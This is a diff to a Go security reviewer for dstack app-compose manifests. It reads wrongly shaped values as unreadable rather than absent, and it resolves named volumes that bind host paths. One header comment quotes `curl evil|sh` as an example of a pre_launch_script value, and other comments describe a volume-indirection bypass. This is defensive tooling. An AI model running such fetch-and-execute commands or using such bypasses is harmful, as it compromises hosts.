@@ -33,6 +33,25 @@ package evidence
 // silent as docker-compose and dstack grow fields, which is the exact failure mode of
 // checking a fixed list and calling it complete.
 //
+// THAT FALLBACK EXISTS AT ALL FOUR LEVELS, and it has to. The manifest nests —
+// app-compose fields, top-level compose keys, service keys, volume-declaration keys —
+// and a level with no fallback is a level where a rule can be undone from outside its
+// own reach. The top-level `volumes:` section is the worked example: a named volume
+// whose `driver_opts.device` is `/etc` makes `- etcbind:/host-etc` mean exactly what
+// `- /etc:/host-etc` means, so a review of `services:` alone reported a clean manifest
+// for a container reading the guest OS's own /etc. Every construct that can deliver a
+// host path into a container therefore goes through ONE verdict function
+// (hostPathVerdict): a direct bind, a named volume backed by a device, and a top-level
+// secret/config `file:`. Three copies of those rules would have been three chances for
+// one of them to be the lenient one.
+//
+// SHAPE IS NEVER READ AS ABSENCE. Every reader that can fail returns an `ok`, and
+// absent is (zero, true) while present-but-wrong-shape is (zero, false) — see the
+// readers at the bottom. `pid: [host]`, `kms_enabled: "true"` and
+// `pre_launch_script: ["curl evil|sh"]` are all the second case, and a reader that
+// collapsed the two gave each of them a clean line. That is worse than having no rule,
+// because a clean line is read as a verdict.
+//
 // THE HASH GATE IS NOT OPTIONAL, which is why ReviewCompose takes the compose_hash
 // rather than a decoded manifest: before that check the text is whatever the provider
 // (or anyone on the path) chose to send, and a review of attacker-chosen YAML is a
@@ -41,7 +60,6 @@ package evidence
 import (
 	"crypto/sha256"
 	"encoding/json"
-	"errors"
 	"fmt"
 	"sort"
 	"strings"
@@ -153,6 +171,12 @@ type ComposeReview struct {
 	// deployment can be handed at boot, and both are chosen by the operator.
 	Features    []string
 	AllowedEnvs []string
+	// FeaturesUnreadable distinguishes "the manifest enables no features" from "the
+	// features field is there and this review could not decode it". Without the flag a
+	// report renders both as "none", which in the second case is a claim the manifest
+	// never made. There is a matching finding; the flag exists so the SUMMARY line
+	// cannot contradict it.
+	FeaturesUnreadable bool
 	// Fields is every top-level app-compose key present, sorted. A report prints it so
 	// a reader can see the manifest's whole surface, not the part this file has rules
 	// for — the two diverge as dstack adds fields, and the gap is where a review goes
@@ -198,13 +222,15 @@ func (r ComposeReview) Summary() string {
 // the quote binds, or they are not JSON. Everything else, including a manifest with
 // no compose text at all, comes back as a review with findings.
 func ReviewCompose(raw []byte, composeHash [attest.ComposeHashLen]byte) (ComposeReview, error) {
-	// One gate, shared with the container-list path, rather than a second sha256 here:
-	// two implementations of "are these the bytes the quote binds" is two answers.
-	ac, err := VerifyAppCompose(raw, composeHash)
-	if err != nil && !errors.Is(err, ErrNoDockerCompose) {
+	// The gate, and ONLY the gate. Deliberately not VerifyAppCompose: its AppCompose
+	// decode is stricter than this review's field reads, so an authenticated manifest
+	// with, say, an `allowed_envs` object would come back as an error — and a caller
+	// returning that error reports a digest mismatch, accusing the provider of serving
+	// a manifest its own quote does not bind. There is still one implementation of the
+	// gate (gateAppCompose); what gets decoded past it is this function's business.
+	if err := gateAppCompose(raw, composeHash); err != nil {
 		return ComposeReview{}, err
 	}
-	noCompose := errors.Is(err, ErrNoDockerCompose)
 
 	// Every key, not the ones AppCompose decodes: the fields with rules below are a
 	// subset of what a manifest may carry, and the report has to show both.
@@ -213,19 +239,22 @@ func ReviewCompose(raw []byte, composeHash [attest.ComposeHashLen]byte) (Compose
 		return ComposeReview{}, fmt.Errorf("app-compose is not a JSON object: %w", err)
 	}
 
-	r := ComposeReview{
-		Name:        ac.Name,
-		AllowedEnvs: ac.AllowedEnvs,
-		Fields:      sortedKeys(fields),
-	}
+	r := ComposeReview{Fields: sortedKeys(fields)}
+	r.Name, _ = jsonString(fields["name"]) // a label; an unreadable one is not a finding
 	r.reviewAppComposeFields(fields)
-	if noCompose {
+
+	text, ok := jsonString(fields["docker_compose_file"])
+	switch {
+	case !ok:
+		r.add(SeverityBlocking, "", "docker_compose_file",
+			"the field is not a string, so the compose text could not be read; nothing below the "+
+				"app-compose level was reviewed")
+	case strings.TrimSpace(text) == "":
 		r.add(SeverityBlocking, "", "docker_compose_file",
 			"the manifest embeds no compose text, so there is nothing to pin per service")
-		r.sortFindings()
-		return r, nil
+	default:
+		r.reviewComposeText([]byte(text))
 	}
-	r.reviewComposeText([]byte(ac.DockerComposeFile))
 	r.sortFindings()
 	return r, nil
 }
@@ -312,21 +341,40 @@ func (r *ComposeReview) reviewAppComposeFields(fields map[string]json.RawMessage
 	// app-compose level assumes docker-compose semantics, so under any other runner a
 	// clean compose half would mean "not read", not "nothing found". An ABSENT runner is
 	// the same finding: the platform may have a default, and guessing which one would be
-	// this review inventing the fact it is supposed to report.
-	r.Runner = jsonString(fields["runner"])
-	switch r.Runner {
-	case "docker-compose":
-	case "":
+	// this review inventing the fact it is supposed to report. An UNREADABLE one has to
+	// say so in its own words — "not set" would be false, and would send someone looking
+	// for a field that is right there.
+	runner, ok := jsonString(fields["runner"])
+	r.Runner = runner
+	switch {
+	case !ok:
+		r.add(SeverityBlocking, "", "runner",
+			"runner is not a string, so it could not be read; nothing below is known to describe what runs")
+	case runner == "docker-compose":
+	case runner == "":
 		r.add(SeverityBlocking, "", "runner",
 			"runner is not set, and this review will not assume the platform's default; "+
 				"without it, nothing below is known to describe what runs")
 	default:
 		r.add(SeverityBlocking, "", "runner", fmt.Sprintf(
-			"runner is %q; this review reads docker-compose semantics, so it can say nothing about what runs", r.Runner))
+			"runner is %q; this review reads docker-compose semantics, so it can say nothing about what runs", runner))
 	}
-	r.Features = jsonStrings(fields["features"])
 
-	if envs := r.AllowedEnvs; len(envs) > 0 {
+	if feats, ok := jsonStrings(fields["features"]); ok {
+		r.Features = feats
+	} else {
+		// FeaturesUnreadable, not an empty list: a report that printed "features=none" for
+		// a features field it could not decode would state a thing the manifest does not say.
+		r.FeaturesUnreadable = true
+		r.add(SeverityJustify, "", "features",
+			"features is not a list of strings, so which platform integrations are enabled could not be read")
+	}
+
+	if envs, ok := jsonStrings(fields["allowed_envs"]); !ok {
+		r.add(SeverityBlocking, "", "allowed_envs",
+			"allowed_envs is not a list of strings, so what the untrusted host may inject at boot could not be "+
+				"read — including whether it can place a credential for root access")
+	} else if r.AllowedEnvs = envs; len(envs) > 0 {
 		r.add(SeverityNote, "", "allowed_envs", fmt.Sprintf(
 			"the host may inject %s — names only, but each is an input the operator chose to accept at boot",
 			strings.Join(envs, ", ")))
@@ -344,14 +392,20 @@ func (r *ComposeReview) reviewAppComposeFields(fields map[string]json.RawMessage
 	// it does NOT fold key_provider_kind/id the way V2/V3 do. So which KMS holds the
 	// app's keys cannot be read out of the quote here, and has to be established some
 	// other way. That gap is the finding.
-	if jsonBool(fields["kms_enabled"]) {
-		kp := jsonString(fields["key_provider"])
-		id := jsonString(fields["key_provider_id"])
-		if kp == "" {
+	if r.flag(fields, "kms_enabled", SeverityJustify) {
+		kp, kpOK := jsonString(fields["key_provider"])
+		id, idOK := jsonString(fields["key_provider_id"])
+		switch {
+		case kp == "" && kpOK:
 			kp = "kms"
+		case !kpOK:
+			kp = "unreadable"
 		}
 		detail := fmt.Sprintf("keys come from an external key provider (%s", kp)
-		if id != "" {
+		switch {
+		case !idOK:
+			detail += ", id unreadable"
+		case id != "":
 			detail += ", id " + id
 		}
 		detail += "), which is therefore in the TCB. This manifest's mr_config_id layout " +
@@ -359,27 +413,34 @@ func (r *ComposeReview) reviewAppComposeFields(fields map[string]json.RawMessage
 			"pin it out of band or the chain has an unmeasured hop"
 		r.add(SeverityJustify, "", "kms_enabled", detail)
 	}
-	if jsonBool(fields["local_key_provider_enabled"]) {
+	if r.flag(fields, "local_key_provider_enabled", SeverityNote) {
 		r.add(SeverityNote, "", "local_key_provider_enabled",
 			"keys are derived inside the CVM instead of from a KMS: one fewer party in the TCB, "+
 				"and no way to recover or migrate the app's state off this machine")
 	}
 
-	if jsonBool(fields["public_logs"]) {
+	if r.flag(fields, "public_logs", SeverityJustify) {
 		r.add(SeverityJustify, "", "public_logs",
 			"container logs are readable from outside the CVM; for a service handling sealed prompts, "+
 				"anything a container logs is disclosed, so this is only safe if every image in the manifest is known not to log payloads")
 	}
-	if jsonBool(fields["public_sysinfo"]) {
+	if r.flag(fields, "public_sysinfo", SeverityNote) {
 		r.add(SeverityNote, "", "public_sysinfo",
 			"host and CVM system info is readable from outside; useful for debugging, and a fingerprint")
 	}
-	if has(fields, "public_tcbinfo") && !jsonBool(fields["public_tcbinfo"]) {
+	// These two fire on FALSE, so they cannot go through flag(): an unreadable value
+	// there comes back false, and the rule would then assert "the CVM does not publish
+	// tcb_info" about a field nobody could read. Read the tri-state directly.
+	if v, ok := jsonBool(fields["public_tcbinfo"]); !ok {
+		r.add(SeverityNote, "", "public_tcbinfo", "the value is not a boolean, so it could not be read")
+	} else if has(fields, "public_tcbinfo") && !v {
 		r.add(SeverityNote, "", "public_tcbinfo",
 			"the CVM does not publish tcb_info, so its /v1/quote reply carries no app_compose and this review "+
 				"cannot be run against it remotely — the manifest has to be supplied out of band")
 	}
-	if has(fields, "secure_time") && !jsonBool(fields["secure_time"]) {
+	if v, ok := jsonBool(fields["secure_time"]); !ok {
+		r.add(SeverityNote, "", "secure_time", "the value is not a boolean, so it could not be read")
+	} else if has(fields, "secure_time") && !v {
 		r.add(SeverityNote, "", "secure_time",
 			"the guest clock is the untrusted host's, so nothing inside the CVM can enforce an expiry or a freshness window")
 	}
@@ -395,14 +456,20 @@ func (r *ComposeReview) reviewAppComposeFields(fields map[string]json.RawMessage
 	// field's meaning has moved across dstack versions. Saying "present, and this review
 	// cannot tell you what it grants" is worth more than either silence or a guess
 	// dressed up as a finding.
-	if jsonBool(fields["host_api_enabled"]) {
+	if r.flag(fields, "host_api_enabled", SeverityJustify) {
 		r.add(SeverityJustify, "", "host_api_enabled",
 			"the host-API channel is on: a path between the CVM and the untrusted host that nothing in the "+
 				"compose text describes. What it exposes depends on the dstack version, which this review does "+
 				"not read — confirm it against that version before treating the manifest as a baseline")
 	}
 
-	if s := jsonString(fields["pre_launch_script"]); strings.TrimSpace(s) != "" {
+	// pre_launch_script is root TCB no image digest covers, which makes it the most
+	// expensive place to read an unreadable value as absent.
+	if s, ok := jsonString(fields["pre_launch_script"]); !ok {
+		r.add(SeverityJustify, "", "pre_launch_script",
+			"pre_launch_script is present but is not a string, so the root-privileged code that runs before "+
+				"any container could not be read or digested")
+	} else if strings.TrimSpace(s) != "" {
 		sum := sha256.Sum256([]byte(s))
 		r.PreLaunchBytes = len(s)
 		r.PreLaunchSHA256 = fmt.Sprintf("%x", sum)
@@ -412,11 +479,25 @@ func (r *ComposeReview) reviewAppComposeFields(fields map[string]json.RawMessage
 				"script is a very different thing from the platform's stock one",
 			r.PreLaunchBytes, r.PreLaunchSHA256))
 	}
-	if s := jsonString(fields["bash_script"]); strings.TrimSpace(s) != "" {
+	if s, ok := jsonString(fields["bash_script"]); !ok || strings.TrimSpace(s) != "" {
 		r.add(SeverityBlocking, "", "bash_script",
 			"the manifest runs a bare shell script instead of (or alongside) a compose file; there are no per-service "+
 				"images to pin, so nothing here can be reduced to a baseline")
 	}
+}
+
+// flag reads a boolean app-compose switch. An unreadable value is REPORTED at sev and
+// comes back false, so the rule that would have fired does not also emit a sentence
+// describing a value nobody could read. Only for rules that fire on TRUE — a rule
+// firing on false has to read the tri-state itself, because false is what this returns
+// for "could not tell".
+func (r *ComposeReview) flag(fields map[string]json.RawMessage, key string, sev Severity) bool {
+	v, ok := jsonBool(fields[key])
+	if !ok {
+		r.add(sev, "", key, "the value is not a boolean, so it could not be read; treat it as set")
+		return false
+	}
+	return v
 }
 
 // benignServiceKeys are the compose service keys that grant nothing beyond what the
@@ -479,10 +560,30 @@ var benignServiceKeys = map[string]bool{
 	"working_dir":       true,
 }
 
+// knownComposeTopKeys is every top-level compose key this file recognises. The
+// unknown-key fallback matters MORE here than at the other two levels: this is the one
+// layer that can redefine what a service's mount means, so a key nobody has looked at
+// is a key that can quietly undo a rule below.
+var knownComposeTopKeys = map[string]bool{
+	"configs":  true,
+	"include":  true,
+	"name":     true,
+	"networks": true,
+	"secrets":  true,
+	"services": true,
+	"version":  true,
+	"volumes":  true,
+}
+
 // reviewComposeText walks the compose document. A document that will not parse is a
 // blocking finding rather than an error: the bytes are authenticated, so "the manifest
 // the enclave booted is not readable YAML" is a fact about the deployment and belongs
 // in the report next to everything else.
+//
+// The top level is walked BEFORE the services, and not only for its own findings: a
+// named volume's source lives up here, and `driver_opts: {type: none, device: /etc, o:
+// bind}` makes `- etcbind:/host-etc` mean exactly what `- /etc:/host-etc` means. Reading
+// services alone left every host-path rule one indirection away from being bypassed.
 func (r *ComposeReview) reviewComposeText(doc []byte) {
 	var root yaml.Node
 	if err := yaml.Unmarshal(doc, &root); err != nil {
@@ -494,13 +595,42 @@ func (r *ComposeReview) reviewComposeText(doc []byte) {
 		r.add(SeverityBlocking, "", "docker_compose_file", "the compose text is an empty document")
 		return
 	}
-	services := mapValue(root.Content[0], "services")
+	top := root.Content[0]
+	if top.Kind != yaml.MappingNode {
+		r.add(SeverityBlocking, "", "docker_compose_file", "the compose text is not a mapping")
+		return
+	}
+
+	for i := 0; i+1 < len(top.Content); i += 2 {
+		key := top.Content[i].Value
+		if key == "" || knownComposeTopKeys[key] || strings.HasPrefix(key, "x-") {
+			continue
+		}
+		r.add(SeverityJustify, "", "compose."+key,
+			"this review has no rule for the top-level compose key; read it before treating the manifest as a "+
+				"baseline — this is the level that can change what a service's mounts and networks resolve to")
+	}
+
+	// include: pulls in another compose file BY PATH. That file is not in the manifest,
+	// so the compose hash does not cover it and nothing below describes what runs.
+	if inc := mapValue(top, "include"); nodeHasContent(inc) {
+		r.add(SeverityBlocking, "", "compose.include",
+			"the manifest includes another compose file by path. That file is not part of the app-compose, so "+
+				"the compose hash does not commit to it — what actually runs is not described by the measured manifest")
+	}
+
+	volumes := r.reviewTopLevelVolumes(mapValue(top, "volumes"))
+	r.reviewFileSources(mapValue(top, "secrets"), "secrets")
+	r.reviewFileSources(mapValue(top, "configs"), "configs")
+	r.reviewTopLevelNetworks(mapValue(top, "networks"))
+
+	services := mapValue(top, "services")
 	if services == nil || services.Kind != yaml.MappingNode {
 		r.add(SeverityBlocking, "", "docker_compose_file", "the compose text has no services mapping")
 		return
 	}
 
-	mounts := &mountIndex{holders: map[string][]string{}, named: map[string]bool{}}
+	mounts := &mountIndex{holders: map[string][]string{}, named: map[string]bool{}, volumes: volumes}
 	for i := 0; i+1 < len(services.Content); i += 2 {
 		name := services.Content[i].Value
 		if name == "" {
@@ -515,6 +645,182 @@ func (r *ComposeReview) reviewComposeText(doc []byte) {
 	r.reviewSharedMounts(mounts)
 }
 
+// namedVolume is what a top-level `volumes:` entry declares, reduced to the two things
+// that change what mounting it means.
+type namedVolume struct {
+	// HostPath is driver_opts.device when that is an absolute path — i.e. the volume is
+	// a bind mount wearing a name. Mounting it is mounting that path, and the per-service
+	// path rules are applied to it as such.
+	HostPath string
+	// External means the volume is not created by this manifest: its contents are
+	// whatever already existed on the host under that name.
+	External bool
+	// Opaque marks a declaration this review could not reduce — an unreadable shape, or
+	// a driver whose semantics it does not know. The per-service pass says so rather
+	// than treating the volume as an empty local one.
+	Opaque string
+}
+
+// knownVolumeKeys are the keys a top-level volume declaration may carry.
+var knownVolumeKeys = map[string]bool{
+	"driver": true, "driver_opts": true, "external": true, "labels": true, "name": true,
+}
+
+// networkFSTypes are driver_opts.type values that make a "local" volume a REMOTE
+// filesystem: the bytes come off the network, from a server the manifest names and
+// nothing measures.
+var networkFSTypes = map[string]bool{"nfs": true, "nfs4": true, "cifs": true, "smb3": true, "ceph": true, "glusterfs": true}
+
+// reviewTopLevelVolumes reduces `volumes:` to what each name means when mounted, and
+// reports the declarations that are more than they look.
+func (r *ComposeReview) reviewTopLevelVolumes(n *yaml.Node) map[string]namedVolume {
+	out := map[string]namedVolume{}
+	if n == nil {
+		return out
+	}
+	if n.Kind != yaml.MappingNode {
+		r.add(SeverityJustify, "", "compose.volumes",
+			"the top-level volumes section is not a mapping, so what the named volumes below resolve to "+
+				"could not be read")
+		return out
+	}
+	for i := 0; i+1 < len(n.Content); i += 2 {
+		name := n.Content[i].Value
+		if name == "" {
+			continue
+		}
+		decl := n.Content[i+1]
+		key := "compose.volumes." + name
+
+		// A bare `name:` with no body is an ordinary empty local volume.
+		if !nodeHasContent(decl) {
+			out[name] = namedVolume{}
+			continue
+		}
+		if decl.Kind != yaml.MappingNode {
+			out[name] = namedVolume{Opaque: "the declaration is not a mapping"}
+			r.add(SeverityJustify, "", key, "the volume declaration could not be read, so what mounting it exposes is unknown")
+			continue
+		}
+
+		var v namedVolume
+		for j := 0; j+1 < len(decl.Content); j += 2 {
+			k := decl.Content[j].Value
+			if k == "" || knownVolumeKeys[k] || strings.HasPrefix(k, "x-") {
+				continue
+			}
+			r.add(SeverityJustify, "", key+"."+k,
+				"this review has no rule for the volume key; read it before treating the manifest as a baseline")
+		}
+
+		if v.External = declaredExternal(decl); v.External {
+			r.add(SeverityJustify, "", key,
+				"the volume is EXTERNAL: this manifest does not create it, so its contents are whatever already "+
+					"existed on the host under that name. The compose hash commits to the name, not to what is in it")
+		}
+
+		if opts := mapValue(decl, "driver_opts"); nodeHasContent(opts) {
+			if opts.Kind != yaml.MappingNode {
+				v.Opaque = "driver_opts could not be read"
+				r.add(SeverityJustify, "", key+".driver_opts",
+					"driver_opts is not a mapping, so whether this volume is a host bind could not be read")
+			} else {
+				device, devOK := nodeScalar(mapValue(opts, "device"))
+				fsType, _ := nodeScalar(mapValue(opts, "type"))
+				switch {
+				case !devOK:
+					v.Opaque = "driver_opts.device could not be read"
+					r.add(SeverityJustify, "", key+".driver_opts",
+						"driver_opts.device is not a scalar, so the host path this volume binds could not be read")
+				case networkFSTypes[strings.ToLower(fsType)]:
+					v.Opaque = fmt.Sprintf("a %s mount of %s", fsType, device)
+					r.add(SeverityBlocking, "", key,
+						fmt.Sprintf("the volume is a %s mount of %s: its contents come off the network from a server "+
+							"nothing here measures, so no image digest describes what the container reads", fsType, device))
+				case strings.HasPrefix(device, "/"):
+					// The bypass this whole section exists for: a host bind wearing a volume
+					// name. Recorded so the per-service pass applies the same path rules it
+					// would to a direct `- /etc:/x`.
+					v.HostPath = device
+				case device != "":
+					v.Opaque = "device " + device
+					r.add(SeverityJustify, "", key,
+						fmt.Sprintf("the volume names device %q, which this review cannot resolve to a host path", device))
+				}
+			}
+		}
+		out[name] = v
+	}
+	return out
+}
+
+// reviewFileSources applies the host-path rules to top-level `secrets:`/`configs:`,
+// whose `file:` is read from the HOST at deploy time and injected into containers —
+// another way a host path reaches a container without appearing in any service's
+// volumes.
+func (r *ComposeReview) reviewFileSources(n *yaml.Node, section string) {
+	if n == nil {
+		return
+	}
+	if n.Kind != yaml.MappingNode {
+		r.add(SeverityJustify, "", "compose."+section,
+			fmt.Sprintf("the top-level %s section is not a mapping, so what it injects could not be read", section))
+		return
+	}
+	for i := 0; i+1 < len(n.Content); i += 2 {
+		name := n.Content[i].Value
+		if name == "" {
+			continue
+		}
+		decl := n.Content[i+1]
+		key := "compose." + section + "." + name
+		if decl.Kind != yaml.MappingNode {
+			r.add(SeverityJustify, "", key, "the declaration could not be read, so what it injects is unknown")
+			continue
+		}
+		if declaredExternal(decl) {
+			r.add(SeverityJustify, "", key,
+				"external: the content is whatever the host already holds under that name, which this manifest "+
+					"does not describe")
+		}
+		if env, ok := nodeScalar(mapValue(decl, "environment")); ok && env != "" {
+			r.add(SeverityJustify, "", key, fmt.Sprintf(
+				"the content comes from environment variable %s at deploy time, so it is chosen outside the "+
+					"measured manifest", env))
+		}
+		file, ok := nodeScalar(mapValue(decl, "file"))
+		if !ok {
+			r.add(SeverityJustify, "", key, "the file: path is not a scalar, so what it reads could not be determined")
+			continue
+		}
+		if file == "" {
+			continue
+		}
+		if sev, why := hostPathVerdict(file); why != "" {
+			r.add(sev, "", key, fmt.Sprintf("reads %s from the host and injects it into containers: %s", file, why))
+		}
+	}
+}
+
+// reviewTopLevelNetworks reports the networks this manifest does not create.
+func (r *ComposeReview) reviewTopLevelNetworks(n *yaml.Node) {
+	if n == nil || n.Kind != yaml.MappingNode {
+		return
+	}
+	for i := 0; i+1 < len(n.Content); i += 2 {
+		name := n.Content[i].Value
+		decl := n.Content[i+1]
+		if name == "" || decl.Kind != yaml.MappingNode {
+			continue
+		}
+		if declaredExternal(decl) {
+			r.add(SeverityJustify, "", "compose.networks."+name,
+				"the network is EXTERNAL: the containers join something that already exists on the host, so what "+
+					"else is reachable on it is not described by this manifest")
+		}
+	}
+}
+
 // mountIndex accumulates the compose file's mounts across services so the
 // cross-service pass can run after every service has been read.
 //
@@ -526,6 +832,10 @@ func (r *ComposeReview) reviewComposeText(doc []byte) {
 type mountIndex struct {
 	holders map[string][]string
 	named   map[string]bool
+	// volumes is the top-level `volumes:` section, reduced. A named volume's source is
+	// declared up there, so without this the per-service pass cannot tell an ordinary
+	// empty volume from a host bind wearing a name.
+	volumes map[string]namedVolume
 }
 
 // reviewService applies the per-service rules and records the service's image.
@@ -649,21 +959,23 @@ func (r *ComposeReview) reviewServiceKey(name, key string, val *yaml.Node) bool 
 		return true
 
 	case "cgroup":
-		if v := nodeScalar(val); strings.EqualFold(v, "host") {
+		v, ok := r.scalar(SeverityBlocking, name, key, val)
+		if ok && strings.EqualFold(v, "host") {
 			r.add(SeverityBlocking, name, key, "the container joins the host cgroup namespace")
 		}
 		return true
 
 	case "cgroup_parent":
-		if nodeScalar(val) != "" {
+		if v, ok := r.scalar(SeverityJustify, name, key, val); ok && v != "" {
 			r.add(SeverityJustify, name, key, fmt.Sprintf(
-				"the container is placed under cgroup %s, outside the tree the runtime would manage", nodeScalar(val)))
+				"the container is placed under cgroup %s, outside the tree the runtime would manage", v))
 		}
 		return true
 
 	case "pid":
-		v := nodeScalar(val)
+		v, ok := r.scalar(SeverityBlocking, name, key, val)
 		switch {
+		case !ok:
 		case strings.EqualFold(v, "host"):
 			r.add(SeverityBlocking, name, key,
 				"the container shares the host PID namespace: it can see and signal every process in the CVM, "+
@@ -675,8 +987,9 @@ func (r *ComposeReview) reviewServiceKey(name, key string, val *yaml.Node) bool 
 		return true
 
 	case "network_mode":
-		v := nodeScalar(val)
+		v, ok := r.scalar(SeverityBlocking, name, key, val)
 		switch {
+		case !ok:
 		case strings.EqualFold(v, "host"):
 			r.add(SeverityBlocking, name, key,
 				"the container shares the host network namespace, so the compose file's port mapping describes "+
@@ -688,9 +1001,10 @@ func (r *ComposeReview) reviewServiceKey(name, key string, val *yaml.Node) bool 
 		return true
 
 	case "ipc":
-		v := nodeScalar(val)
+		v, ok := r.scalar(SeverityJustify, name, key, val)
 		l := strings.ToLower(v)
 		switch {
+		case !ok:
 		case l == "host", l == "shareable", strings.HasPrefix(l, "container:"), strings.HasPrefix(l, "service:"):
 			// A GPU model server legitimately needs a shared IPC namespace for its
 			// shared-memory transport, which is why this is not blocking.
@@ -701,13 +1015,13 @@ func (r *ComposeReview) reviewServiceKey(name, key string, val *yaml.Node) bool 
 		return true
 
 	case "uts":
-		if strings.EqualFold(nodeScalar(val), "host") {
+		if v, ok := r.scalar(SeverityJustify, name, key, val); ok && strings.EqualFold(v, "host") {
 			r.add(SeverityJustify, name, key, "the container shares the host UTS namespace")
 		}
 		return true
 
 	case "userns_mode":
-		if strings.EqualFold(nodeScalar(val), "host") {
+		if v, ok := r.scalar(SeverityJustify, name, key, val); ok && strings.EqualFold(v, "host") {
 			r.add(SeverityJustify, name, key,
 				"the container opts out of user-namespace remapping, so its root is the CVM's root wherever "+
 					"the runtime would otherwise have remapped it")
@@ -786,6 +1100,23 @@ func (r *ComposeReview) reviewServiceKey(name, key string, val *yaml.Node) bool 
 	return false
 }
 
+// scalar reads a scalar service key, REPORTING at sev when the value is present but is
+// not a scalar and returning ok=false so the rule skips rather than acting on "".
+//
+// `pid: [host]` is the case this exists for. Without it nodeScalar's "" reads as absent,
+// the rule stays quiet, and the report prints a clean line for a service that shares the
+// host PID namespace — the wrong-shape-reads-as-safe failure this file's header calls
+// out, on the branch where it costs the most.
+func (r *ComposeReview) scalar(sev Severity, name, key string, val *yaml.Node) (string, bool) {
+	v, ok := nodeScalar(val)
+	if !ok {
+		r.add(sev, name, key,
+			"the value is not a scalar, so it could not be read; treat it as set to whatever it names")
+		return "", false
+	}
+	return v, true
+}
+
 // guestAgentSockets are the dstack guest-agent endpoints. A container holding one can
 // derive the app's keys and request quotes IN THE APP'S NAME — it is the app's
 // identity, not merely a debugging channel. read_only does not reduce this: it is a
@@ -836,6 +1167,41 @@ func (r *ComposeReview) reviewVolumes(name string, val *yaml.Node, mounts *mount
 			continue // an anonymous volume: created empty, reachable by nothing else
 		}
 		mounts.holders[src] = append(mounts.holders[src], name)
+
+		// A named volume: resolve it through the top-level section before deciding it is
+		// harmless. `- etcbind:/host-etc` over a volume whose driver_opts.device is /etc
+		// is `- /etc:/host-etc`, and this is where the two become the same finding.
+		if !strings.HasPrefix(src, "/") && !isRelativeBind(src) {
+			decl, declared := mounts.volumes[src]
+			switch {
+			case declared && decl.HostPath != "":
+				mounts.named[src] = true
+				if sev, why := hostPathVerdict(decl.HostPath); why != "" {
+					r.add(sev, name, "volumes", fmt.Sprintf(
+						"%s -> %s (%s) resolves to the HOST PATH %s (compose.volumes.%s driver_opts.device): %s",
+						src, target, mode(ro), decl.HostPath, src, why))
+				} else {
+					r.add(SeverityJustify, name, "volumes", fmt.Sprintf(
+						"%s -> %s (%s) is a host bind of %s wearing a volume name (compose.volumes.%s "+
+							"driver_opts.device); a baseline reading service mounts alone would not see it",
+						src, target, mode(ro), decl.HostPath, src))
+				}
+			case declared && decl.Opaque != "":
+				mounts.named[src] = true
+				r.add(SeverityJustify, name, "volumes", fmt.Sprintf(
+					"%s -> %s (%s): %s, so what the container reads through it is unknown",
+					src, target, mode(ro), decl.Opaque))
+			case !declared:
+				// Compose requires a top-level declaration for a named volume, so a mount
+				// naming one that is not there means either an implicit external volume or a
+				// manifest this review is not reading the way the runtime does.
+				r.add(SeverityJustify, name, "volumes", fmt.Sprintf(
+					"%s -> %s (%s) names a volume the compose file does not declare, so its source is not in "+
+						"the manifest", src, target, mode(ro)))
+			}
+			continue // the shared-mount pass covers the plain-named case
+		}
+
 		if isRelativeBind(src) {
 			// A relative bind resolves against wherever the manifest was deployed FROM,
 			// which the manifest does not record — so "./data" and "../../../etc" are
@@ -848,43 +1214,50 @@ func (r *ComposeReview) reviewVolumes(name string, val *yaml.Node, mounts *mount
 				src, target))
 			continue
 		}
-		if !strings.HasPrefix(src, "/") {
-			continue // a named volume; the shared-mount pass is what has something to say
-		}
-		mode := "rw"
-		if ro {
-			mode = "ro"
-		}
-		where := fmt.Sprintf("%s -> %s (%s)", src, target, mode)
-		// Each branch marks the source named, so reviewSharedMounts leaves it alone: a
-		// line that says which service holds it and what it grants is strictly more than
+		// A direct host bind. Marking the source named keeps reviewSharedMounts off it: a
+		// line saying which service holds it and what it grants is strictly more than
 		// "two services share this", and printing both makes one mount read as two
-		// problems. The flag is set per branch rather than in a second condition list —
-		// duplicating these conditions is exactly how the two would drift apart.
-		switch {
-		case guestAgentSockets[src]:
+		// problems.
+		if sev, why := hostPathVerdict(src); why != "" {
 			mounts.named[src] = true
-			r.add(SeverityJustify, name, "volumes", fmt.Sprintf(
-				"%s: the guest-agent socket. A container holding it can derive the app's keys and obtain "+
-					"quotes in the app's name, so every service with it is as trusted as the app itself — a "+
-					"baseline must list them exactly, and read_only changes nothing for a socket", where))
-		case dockerSockets[src]:
-			mounts.named[src] = true
-			r.add(SeverityBlocking, name, "volumes", fmt.Sprintf(
-				"%s: the container runtime's socket. A container holding it can start any container it likes, "+
-					"privileged included, so it is a complete escape from everything else in this manifest", where))
-		case src == "/dev/shm" || strings.HasPrefix(src, "/dev/shm/"):
-			mounts.named[src] = true
-			r.add(SeverityJustify, name, "volumes", fmt.Sprintf(
-				"%s: shared memory. Legitimate for a model server's transport, and a channel between whoever "+
-					"holds it", where))
-		case blockingHostExact[src], hasPrefixPath(src, blockingHostPrefixes):
-			mounts.named[src] = true
-			r.add(SeverityBlocking, name, "volumes", fmt.Sprintf(
-				"%s: a host tree the CVM's own OS owns. Whatever the image digest says the container contains, "+
-					"this is what it actually reads", where))
+			r.add(sev, name, "volumes", fmt.Sprintf("%s -> %s (%s): %s", src, target, mode(ro), why))
 		}
 	}
+}
+
+// mode renders a mount's read-only flag.
+func mode(ro bool) string {
+	if ro {
+		return "ro"
+	}
+	return "rw"
+}
+
+// hostPathVerdict is the one place a host path is judged, and why is "" for a path with
+// nothing to say about it.
+//
+// It exists as a function rather than a switch inside reviewVolumes because three
+// different constructs deliver a host path into a container — a direct bind, a named
+// volume whose driver_opts.device is a path, and a top-level secret/config `file:` — and
+// each was a separate way to reach the same exposure. Three copies of the rules would
+// have been three chances for one of them to be the lenient one.
+func hostPathVerdict(path string) (Severity, string) {
+	switch {
+	case guestAgentSockets[path]:
+		return SeverityJustify, "the guest-agent socket. A container holding it can derive the app's keys and " +
+			"obtain quotes in the app's name, so every service with it is as trusted as the app itself — a " +
+			"baseline must list them exactly, and read_only changes nothing for a socket"
+	case dockerSockets[path]:
+		return SeverityBlocking, "the container runtime's socket. A container holding it can start any container " +
+			"it likes, privileged included, so it is a complete escape from everything else in this manifest"
+	case path == "/dev/shm" || strings.HasPrefix(path, "/dev/shm/"):
+		return SeverityJustify, "shared memory. Legitimate for a model server's transport, and a channel between " +
+			"whoever holds it"
+	case blockingHostExact[path], hasPrefixPath(path, blockingHostPrefixes):
+		return SeverityBlocking, "a host tree the CVM's own OS owns. Whatever the image digest says the container " +
+			"contains, this is what it actually reads"
+	}
+	return SeverityNote, ""
 }
 
